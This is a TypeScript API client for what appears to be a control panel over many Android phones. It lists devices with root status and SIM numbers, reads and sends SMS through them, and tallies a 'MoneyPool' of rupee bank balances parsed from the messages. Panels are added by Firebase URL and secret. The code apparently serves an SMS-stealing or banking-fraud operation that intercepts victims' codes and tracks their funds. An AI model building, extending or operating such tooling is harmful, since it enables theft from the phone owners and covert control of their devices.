// ─── Base URL ──────────────────────────────────────────────────────────────

const RAILWAY_DOMAIN = 'api-server-production-5907.up.railway.app';

function getBase(): string {
  const domain = process.env.EXPO_PUBLIC_DOMAIN ?? RAILWAY_DOMAIN;
  const proto = domain.includes('localhost') ? 'http' : 'https';
  return `${proto}://${domain}/api`;
}

// ─── Core Fetch ────────────────────────────────────────────────────────────

async function apiFetch<T = unknown>(
  path: string,
  options: RequestInit = {},
  token?: string | null,
): Promise<T> {
  const headers: Record<string, string> = {
    'Content-Type': 'application/json',
    ...(options.headers as Record<string, string> | undefined),
  };
  if (token) headers['Authorization'] = `Bearer ${token}`;

  const res = await fetch(`${getBase()}${path}`, { ...options, headers });
  const data = await res.json();

  if (!res.ok) {
    throw new ApiError(res.status, data?.error ?? 'Unknown error', data);
  }
  return data as T;
}

export class ApiError extends Error {
  constructor(
    public readonly status: number,
    message: string,
    public readonly body?: unknown,
  ) {
    super(message);
    this.name = 'ApiError';
  }
}

// ─── Auth ──────────────────────────────────────────────────────────────────

export interface LoginCapacitySession {
  id: number;
  ip: string | null;
  userAgent: string | null;
  city: string | null;
  region: string | null;
  country: string | null;
  occurredAt: string;
}

export type LoginResult =
  | { ok: true; otpId: string }
  | { ok: true; token: string; user: ZeninUser; loginEventId: number }
  | { ok: false; error: string }
  | { ok: false; error: 'login_capacity_full'; activeSessions: LoginCapacitySession[]; preAuthId: string };

export interface ZeninUser {
  userId: string;
  name: string;
  role: string;
  tgUid: number;
}

export async function apiLogin(
  username: string,
  password: string,
): Promise<LoginResult> {
  try {
    const data = await apiFetch<{
      otpPending?: boolean;
      otpId?: string;
      token?: string;
      user?: ZeninUser;
      loginEventId?: number;
    }>('/auth/login', {
      method: 'POST',
      body: JSON.stringify({ username, password }),
    });
    if (data.token && data.user) {
      return { ok: true, token: data.token, user: data.user, loginEventId: data.loginEventId! };
    }
    return { ok: true, otpId: data.otpId! };
  } catch (e) {
    if (e instanceof ApiError && e.status === 409) {
      const body = e.body as { activeSessions: LoginCapacitySession[]; preAuthId: string };
      return {
        ok: false,
        error: 'login_capacity_full',
        activeSessions: body.activeSessions,
        preAuthId: body.preAuthId,
      };
    }
    const rawErr = e instanceof ApiError ? e.message : 'Connection failed';
    return {
      ok: false,
      error:
        rawErr === 'otp_bot_not_started'
          ? 'Open Telegram and send /start to @ZeninPortalBot, then sign in again.'
          : rawErr === 'otp_send_failed'
            ? 'Could not send OTP to your Telegram. Please try again.'
            : rawErr === 'otp_no_telegram'
              ? 'Your account has no Telegram linked. Contact your administrator.'
              : rawErr,
    };
  }
}

export type OtpResult =
  | { ok: true; token: string; user: ZeninUser; loginEventId: number }
  | { ok: false; error: string; attemptsLeft?: number }
  | { ok: false; error: 'login_capacity_full'; activeSessions: LoginCapacitySession[]; preAuthId: string };

export async function apiVerifyOtp(otpId: string, otp: string): Promise<OtpResult> {
  try {
    const data = await apiFetch<{ token: string; user: ZeninUser; loginEventId: number }>(
      '/auth/otp/verify',
      { method: 'POST', body: JSON.stringify({ otpId, otp }) },
    );
    return { ok: true, ...data };
  } catch (e) {
    if (e instanceof ApiError && e.status === 409) {
      const body = e.body as { activeSessions: LoginCapacitySession[]; preAuthId: string };
      return {
        ok: false,
        error: 'login_capacity_full',
        activeSessions: body.activeSessions,
        preAuthId: body.preAuthId,
      };
    }
    const body = (e instanceof ApiError ? e.body : null) as { attemptsLeft?: number } | null;
    const rawErr = e instanceof ApiError ? e.message : 'Connection failed';
    const left = body?.attemptsLeft ?? 0;
    const friendlyErr =
      rawErr === 'otp_invalid'
        ? `Incorrect code.${left > 0 ? ` ${left} attempt${left === 1 ? '' : 's'} left.` : ''}`
        : rawErr === 'otp_expired'
          ? 'Code expired. Please sign in again.'
          : rawErr === 'otp_too_many_attempts'
            ? 'Too many incorrect attempts. Please sign in again.'
            : rawErr;
    return { ok: false, error: friendlyErr, attemptsLeft: left };
  }
}

export type EvictResult =
  | { ok: true; otpPending: true; otpId: string }
  | { ok: true; token: string; user: ZeninUser }
  | { ok: false; error: string };

export async function apiEvictAndLogin(
  preAuthId: string,
  evictEventId: number,
): Promise<EvictResult> {
  try {
    const data = await apiFetch<{
      token?: string;
      user?: ZeninUser;
      otpPending?: boolean;
      otpId?: string;
    }>(
      '/auth/login/evict-and-login',
      { method: 'POST', body: JSON.stringify({ preAuthId, evictEventId }) },
    );
    if (data.otpPending && data.otpId) {
      return { ok: true, otpPending: true, otpId: data.otpId };
    }
    return { ok: true, token: data.token!, user: data.user! };
  } catch (e) {
    const rawErr = e instanceof ApiError ? e.message : 'Connection failed';
    return {
      ok: false,
      error:
        rawErr === 'otp_bot_not_started'
          ? 'Open Telegram and send /start to @ZeninPortalBot, then sign in again.'
          : rawErr === 'otp_send_failed'
            ? 'Could not send OTP to your Telegram. Please try again.'
            : rawErr,
    };
  }
}

export async function apiLogout(token: string): Promise<void> {
  try {
    await apiFetch('/auth/logout', { method: 'POST' }, token);
  } catch {
    // best-effort
  }
}

export interface Session {
  id: number;
  ip: string | null;
  userAgent: string | null;
  city: string | null;
  region: string | null;
  country: string | null;
  occurredAt: string;
}

export async function apiGetSessions(token: string): Promise<Session[]> {
  const data = await apiFetch<{ sessions: Session[] }>('/auth/sessions', {}, token);
  return data.sessions;
}

// ─── Devices ───────────────────────────────────────────────────────────────

export interface SimCard {
  phoneNumber: string;
  carrierName: string;
}

export interface Device {
  id: string;
  panelId: string;
  name: string;
  status: boolean;
  battery: number | null;
  batteryRaw: string;
  mobNo: string;
  ipAddress: string;
  androidV: string;
  storage: string;
  sdkV: string;
  serviceProvider: string;
  isRoot: boolean;
  sims: SimCard[];
  joined: string;
  joinedTs: number;
  lastSeen: number;
  // eslint-disable-next-line @typescript-eslint/no-explicit-any
  smsAnalysis?: Record<string, any>;
}

export interface MoneyPoolSummary {
  /** Total bank balance in rupees (integer, e.g. 4350000 = ₹43.5L) */
  totalBalance: number;
  /** Number of bank accounts with known balance */
  fundCount: number;
  /** Number of bank accounts with no parseable balance */
  unknownCount: number;
}

export interface DevicesResponse {
  devices: Device[];
  summary: MoneyPoolSummary;
}

export async function apiGetDevices(token: string): Promise<DevicesResponse> {
  const data = await apiFetch<{ devices: Device[]; total: number; summary?: MoneyPoolSummary }>(
    '/devices', {}, token,
  );
  return {
    devices: data.devices ?? [],
    summary: data.summary ?? { totalBalance: 0, fundCount: 0, unknownCount: 0 },
  };
}

// ─── SMS ───────────────────────────────────────────────────────────────────

export interface SmsMessage {
  key: string;
  message: string;
  sender: string;
  dateTime: string;
  type: 'incoming' | 'outgoing';
  ts: number;
}

export async function apiGetDeviceSms(
  deviceId: string,
  panelId: string,
  token: string,
  limit = 100,
): Promise<SmsMessage[]> {
  const qs = `?panelId=${encodeURIComponent(panelId)}&limit=${limit}`;
  const data = await apiFetch<{ messages: SmsMessage[] }>(
    `/sms/${encodeURIComponent(deviceId)}${qs}`,
    {},
    token,
  );
  return data.messages;
}

export interface SendSmsResult {
  ok: boolean;
  error?: string;
}

// ─── Panel Configs ─────────────────────────────────────────────────────────

export interface PanelStats {
  online: number;
  offline: number;
  total: number;
  bank: number;
  card: number;
  smsTotal: number;
}

export interface PanelConfig {
  id: string;
  name: string;
  firebaseUrl: string;
  isActive: boolean;
  createdAt: string;
  /** Live stats from device-watcher cache — present if an SSE subscriber is active. */
  stats?: PanelStats;
}

export async function apiGetPanelConfigs(token: string): Promise<PanelConfig[]> {
  const data = await apiFetch<{ configs: PanelConfig[] }>('/panel/configs', {}, token);
  return data.configs;
}

export async function apiAddPanelConfig(
  token: string,
  name: string,
  firebaseUrl: string,
  firebaseSecret: string,
): Promise<{ config: PanelConfig; deviceCount: number }> {
  const data = await apiFetch<{ config: PanelConfig; deviceCount: number }>(
    '/panel/configs',
    { method: 'POST', body: JSON.stringify({ name, firebaseUrl, firebaseSecret }) },
    token,
  );
  return { config: data.config, deviceCount: data.deviceCount ?? 0 };
}

export async function apiDeletePanelConfig(token: string, id: string): Promise<void> {
  await apiFetch(`/panel/configs/${encodeURIComponent(id)}`, { method: 'DELETE' }, token);
}

export async function apiTestPanelConfig(
  token: string,
  id: string,
): Promise<{ ok: boolean; deviceCount?: number; error?: string }> {
  try {
    const data = await apiFetch<{ ok: boolean; deviceCount: number }>(
      `/panel/configs/${encodeURIComponent(id)}/test`,
      { method: 'POST' },
      token,
    );
    return data;
  } catch (e) {
    return { ok: false, error: e instanceof ApiError ? e.message : 'Test failed' };
  }
}

// ── Share Link Generation ──────────────────────────────────────────────────

/**
 * Generate an encrypted share-link token for a specific device.
 * The full URL is constructed by the caller:
 *   https://<EXPO_PUBLIC_DOMAIN>/zenin/share/<token>
 */
export async function apiGenerateShareLink(
  panelId: string,
  deviceId: string,
  deviceName: string | undefined,
  token: string,
): Promise<{ token: string }> {
  return apiFetch<{ token: string }>(
    '/share/generate-link',
    { method: 'POST', body: JSON.stringify({ panelId, deviceId, deviceName }) },
    token,
  );
}

export async function apiSendSms(
  deviceId: string,
  panelId: string,
  to: string,
  message: string,
  sim: number,
  token: string,
): Promise<SendSmsResult> {
  try {
    await apiFetch(
      `/sms/send/${encodeURIComponent(deviceId)}`,
      {
        method: 'POST',
        body: JSON.stringify({ to, message, sim, panelId }),
      },
      token,
    );
    return { ok: true };
  } catch (e) {
    return { ok: false, error: e instanceof ApiError ? e.message : 'Send failed' };
  }
}
